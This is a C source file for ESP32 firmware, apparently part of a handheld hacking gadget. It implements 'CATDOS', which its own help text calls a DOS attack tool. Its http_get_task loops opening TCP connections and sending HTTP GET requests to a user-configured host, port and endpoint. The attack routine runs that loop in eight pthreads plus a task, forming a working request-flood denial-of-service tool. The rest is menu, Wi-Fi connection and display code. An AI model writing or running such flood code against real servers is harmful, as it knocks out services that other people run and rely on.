/* BSD non-blocking socket example

   This example code is in the Public Domain (or CC0 licensed, at your option.)

   Unless required by applicable law or agreed to in writing, this
   software is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
   CONDITIONS OF ANY KIND, either express or implied.
*/
#include <esp_pthread.h>
#include <pthread.h>
#include <string.h>
#include "animations_task.h"
#include "bitmaps_general.h"
#include "cat_console.h"
#include "cmd_wifi.h"
#include "deauth_screens.h"
#include "esp_log.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "general_notification.h"
#include "general_scrolling_text.h"
#include "general_submenu.h"
#include "lwip/dns.h"
#include "lwip/err.h"
#include "lwip/netdb.h"
#include "lwip/sockets.h"
#include "lwip/sys.h"
#include "menus_module.h"
#include "oled_screen.h"
#include "preferences.h"
#include "sdkconfig.h"
#include "task_manager.h"
#include "wifi_ap_manager.h"
#include "wifi_bitmaps.h"

static uint8_t last_main_selection = 0;
static TaskHandle_t task_atack = NULL;
static volatile bool running_attack = false;
static const char* CATDOS_TAG = "catdos_module";
static int aps_count = 0;
static char* wifi_list[20];
static char* target_details[6];
static char host[32];
static char port[32];
static char endpoint[32];

static const char* main_menu_options[] = {
    NULL,
    "Target",
    "Attack",
    "Help",
};

static void catdos_module_display_attack_animation();
static void catdos_module_show_target();
static void catdos_module_show_menu();
static void catdos_module_set_menu_selector(uint8_t option);

static const char* settings_help_txt[] = {
    "This app is",
    "still in beta",
    "",
    "CATDOS",
    "is a DOS attack",
    "tool for wifi",
    "",
    "First, configure",
    "the Access Point",
    "if you have not",
    "saved a AP yet",
    "you can use",
    "the command:",
    "save",
    "<ssid> <pass>",
    "Then, list the",
    "APs with: list",
    "And use the",
    "command:",
    "connect <index>",
    "to connect to",
    " the AP, then",
    "select in the",
    "Target menu",
    "once you are",
    "connected to",
    "the AP, you can",
    "configure the",
    "target with the"
    "command:",
    "web_config",
    "<host>"
    "<port>",
    "<endpoint>",
    "If the minino",
    "saves the last",
    "target, if you",
    "don't need to",
    "change, you can",
    "just use the",
    "command:",
    "catdos",
    "to start the",
    "attack or",
    "use the attack",
    "from the menu",
};

void catdos_module_display_connecting() {
  oled_screen_clear_buffer();
#ifdef CONFIG_RESOLUTION_128X64
  uint8_t width = 32;
  uint8_t height = 32;
  uint8_t x = (128 - width) / 2;
#else
  uint8_t width = 32;
  uint8_t height = 32;
  uint8_t x = (64 - width) / 2;
  // uint8_t x = 0;
#endif

  static uint8_t idx = 0;
  oled_screen_display_bitmap(wifi_loading[idx], x, 1, width, height,
                             OLED_DISPLAY_NORMAL);
  idx = ++idx > 3 ? 0 : idx;
  oled_screen_display_show();
}

static void catdos_module_display_attack_animation() {
  // TODO : Change this, with the real animation
  catdos_module_display_connecting();
}

void catdos_module_set_target(char* host, char* port, char* endpoint) {
  esp_err_t err;
  err = preferences_put_string("host", host);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error setting host");
    printf("Error setting host");
    return;
  }
  err = preferences_put_string("port", port);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error setting port");
    printf("Error setting port");
    return;
  }
  err = preferences_put_string("endpoint", endpoint);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error setting endpoint");
    printf("Error setting endpoint");
    return;
  }

  printf("Host: %s %s %s\n", host, port, endpoint);
}

static void http_get_task(void* pvParameters) {
  const struct addrinfo hints = {
      .ai_family = AF_INET,
      .ai_socktype = SOCK_STREAM,
  };
  struct addrinfo* res;
  struct in_addr* addr;
  int s, r;
  char recv_buf[64];

  char* request = (char*) malloc(128);
  sprintf(request, "GET %s HTTP/1.0\r\nHost: %s:%s\r\n", endpoint, host, port);
  running_attack = true;

  while (running_attack) {
    int err = getaddrinfo(host, port, &hints, &res);

    if (err != 0 || res == NULL) {
      ESP_LOGE(CATDOS_TAG, "DNS lookup failed err=%d res=%p", err, res);
      vTaskDelay(1000 / portTICK_PERIOD_MS);
      continue;
    }

    addr = &((struct sockaddr_in*) res->ai_addr)->sin_addr;

    s = socket(res->ai_family, res->ai_socktype, 0);
    if (s < 0) {
      ESP_LOGE(CATDOS_TAG, "... Failed to allocate socket.");
      freeaddrinfo(res);
      vTaskDelay(1000 / portTICK_PERIOD_MS);
      break;
    }

    if (connect(s, res->ai_addr, res->ai_addrlen) != 0) {
      ESP_LOGE(CATDOS_TAG, "... socket connect failed errno=%d", errno);
      close(s);
      freeaddrinfo(res);
      vTaskDelay(4000 / portTICK_PERIOD_MS);
      break;
    }

    freeaddrinfo(res);

    if (write(s, request, strlen(request)) < 0) {
      ESP_LOGE(CATDOS_TAG, "... socket send failed");
      close(s);
      vTaskDelay(400 / portTICK_PERIOD_MS);
      break;
    }
    close(s);
  }
  // running_attack = false;
  vTaskDelete(NULL);
}

static void catdos_module_send_attack_task(void* pvParameters) {
  ESP_LOGI(CATDOS_TAG, "Sending attack");
  task_manager_create(&http_get_task, "http_get_task", TASK_STACK_MEDIUM, NULL,
                      TASK_PRIORITY_NORMAL, &task_atack);

  pthread_attr_t attr;
  pthread_t thread1, thread2, thread3, thread4, thread5, thread6, thread7,
      thread8;
  esp_pthread_cfg_t esp_pthread_cfg;
  int res;

  res = pthread_create(&thread1, NULL, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_attr_init(&attr);
  assert(res == 0);
  pthread_attr_setstacksize(&attr, 16384);
  res = pthread_create(&thread2, &attr, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_create(&thread3, NULL, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_create(&thread4, NULL, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_create(&thread5, NULL, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_create(&thread6, NULL, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_create(&thread7, NULL, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_create(&thread8, NULL, (void*) http_get_task, NULL);
  assert(res == 0);

  res = pthread_join(thread1, NULL);
  assert(res == 0);
  res = pthread_join(thread2, NULL);
  assert(res == 0);
  res = pthread_join(thread3, NULL);
  assert(res == 0);
  res = pthread_join(thread4, NULL);
  assert(res == 0);
  res = pthread_join(thread5, NULL);
  assert(res == 0);
  res = pthread_join(thread6, NULL);
  assert(res == 0);
  res = pthread_join(thread7, NULL);
  assert(res == 0);
  res = pthread_join(thread8, NULL);
  assert(res == 0);

  vTaskDelete(NULL);
}

int catdos_module_send_attack(int argc, char** argv) {
  task_manager_create(&catdos_module_send_attack_task, "catdos_send",
                      TASK_STACK_MEDIUM, NULL, TASK_PRIORITY_NORMAL, NULL);
  return 0;
}

static bool catdos_module_display_if_nconnect() {
  bool connected = preferences_get_bool("wifi_connected", false);
  if (!connected) {
    general_notification_ctx_t notification = {0};
    notification.duration_ms = 2000;
    notification.head = "Wifi";
    notification.body = "Connect first";
    general_notification(notification);
  }
  return connected;
}

static void catdos_module_exit_app() {
  wifi_ap_manager_unregister_callback();
  menus_module_restart();
}

static void catdos_module_show_menu() {
  bool wifi_connection = preferences_get_bool("wifi_connected", false);

  if (wifi_connection) {
    main_menu_options[0] = "Connected";
  } else {
    main_menu_options[0] = "Select AP";
  }

  general_submenu_menu_t main = {0};
  main.options = main_menu_options;
  main.options_count = sizeof(main_menu_options) / sizeof(char*);
  main.select_cb = catdos_module_set_menu_selector;
  main.selected_option = last_main_selection;
  main.exit_cb = catdos_module_exit_app;

  general_submenu(main);
}

static int catdos_module_get_target() {
  esp_err_t err = preferences_get_string("host", host, 32);
  if (err != ESP_OK) {
    return -1;
  }
  err = preferences_get_string("port", port, 32);
  if (err != ESP_OK) {
    return -2;
  }
  err = preferences_get_string("endpoint", endpoint, 32);
  if (err != ESP_OK) {
    return -3;
  }
  return 0;
}

static void catdos_module_show_target() {
  int err = catdos_module_get_target();

  if (err == 0) {
    target_details[1] = malloc(32);
    target_details[1] = strdup(host);
  } else {
    target_details[1] = "Not set";
  }
  if (err == 0) {
    target_details[3] = malloc(32);
    target_details[3] = strdup(port);
  } else {
    target_details[3] = "Not set";
  }
  if (err == 0) {
    target_details[5] = malloc(32);
    target_details[5] = strdup(endpoint);
  } else {
    target_details[5] = "Not set";
  }
  target_details[0] = "IP";
  target_details[2] = "Port";
  target_details[4] = "URL";

  general_submenu_menu_t submenu_target = {0};
  submenu_target.options = (const char**) target_details;
  submenu_target.options_count = sizeof(main_menu_options) / sizeof(char*);
  submenu_target.select_cb = NULL;
  submenu_target.selected_option = 0;
  submenu_target.exit_cb = catdos_module_show_menu;

  general_submenu(submenu_target);
}

static void catdos_module_show_connection_cb(bool state) {
  animations_task_stop();
  general_notification_ctx_t notification = {0};

  notification.duration_ms = 2000;
  notification.head = "Wifi";
  if (state) {
    notification.body = "Connected";
  } else {
    notification.body = "Error";
  }
  general_notification(notification);
  catdos_module_show_menu();
}

static void catdos_module_show_help() {
  general_scrolling_text_ctx help = {0};
  help.banner = "CATDOS Help";
  help.text_arr = settings_help_txt;
  help.text_len = sizeof(settings_help_txt) / sizeof(char*);
  help.scroll_type = GENERAL_SCROLLING_TEXT_CLAMPED;
  help.window_type = GENERAL_SCROLLING_TEXT_WINDOW;
  help.exit_cb = catdos_module_show_menu;

  general_scrolling_text_array(help);
}

static void catdos_module_show_no_target() {
  general_notification_ctx_t notification = {0};

  notification.duration_ms = 2000;
  notification.head = "Not found";
  notification.body = "No Target saved";
  general_notification(notification);
  catdos_module_show_menu();
}

static void catdos_module_show_no_aps() {
  general_notification_ctx_t notification = {0};

  notification.duration_ms = 2000;
  notification.head = "Not found";
  notification.body = "No APs saved";
  general_notification(notification);
  catdos_module_show_menu();
}

static void catdos_module_connect_selected(uint8_t option) {
  animations_task_run(&catdos_module_display_connecting, 100, NULL);
  wifi_ap_manager_connect_index_cb(option, catdos_module_show_connection_cb);
}

static void catdos_module_exit_aps() {
  for (int i = 0; i < aps_count; i++) {
    free(wifi_list[i]);
  }
  aps_count = 0;
  catdos_module_show_menu();
}

static void catdos_module_show_aps() {
  aps_count = preferences_get_int("count_ap", 0);

  if (aps_count == 0) {
    catdos_module_show_no_aps();
    return;
  }
  for (int i = 0; i < aps_count; i++) {
    char wifi_ap[100];
    char wifi_ssid[100];
    sprintf(wifi_ap, "wifi%d", i);
    esp_err_t err = preferences_get_string(wifi_ap, wifi_ssid, 100);
    if (err != ESP_OK) {
      continue;
    }
    wifi_list[i] = malloc(sizeof(wifi_ssid));
    wifi_list[i] = strdup(wifi_ssid);
  }
  general_submenu_menu_t menu_aps = {0};
  menu_aps.options = (const char**) wifi_list;
  menu_aps.options_count = aps_count;
  menu_aps.select_cb = catdos_module_connect_selected;
  menu_aps.selected_option = 0;
  menu_aps.exit_cb = catdos_module_exit_aps;

  general_submenu(menu_aps);
}

static void catdos_module_set_menu_selector(uint8_t option) {
  last_main_selection = option;
  switch (option) {
    case CATDOS_MENU_AP:
      catdos_module_show_aps();
      break;
    case CATDOS_MENU_TARGET:

      catdos_module_show_target();
      break;
    case CATDOS_MENU_ATTACK:
      if (!catdos_module_display_if_nconnect()) {
        catdos_module_show_aps();
        return;
      }
      if (catdos_module_get_target() == 0) {
        animations_task_run(&catdos_module_display_attack_animation, 100, NULL);
        task_manager_create(&catdos_module_send_attack_task, "catdos_send",
                            TASK_STACK_MEDIUM, NULL, TASK_PRIORITY_NORMAL,
                            NULL);
      } else {
        catdos_module_show_no_target();
      }
      break;
    case CATDOS_MENU_HELP:
      catdos_module_show_help();
      break;
    default:
      break;
  }
}

void catdos_module_begin() {
  oled_screen_clear(OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("THIS APP STILL", 0, OLED_DISPLAY_INVERT);
  oled_screen_display_text_center("IN BETA", 1, OLED_DISPLAY_INVERT);
  vTaskDelay(2000 / portTICK_PERIOD_MS);
  oled_screen_clear(OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("CATDOS", 0, OLED_DISPLAY_NORMAL);
  show_dos_commands();

  catdos_module_show_menu();
}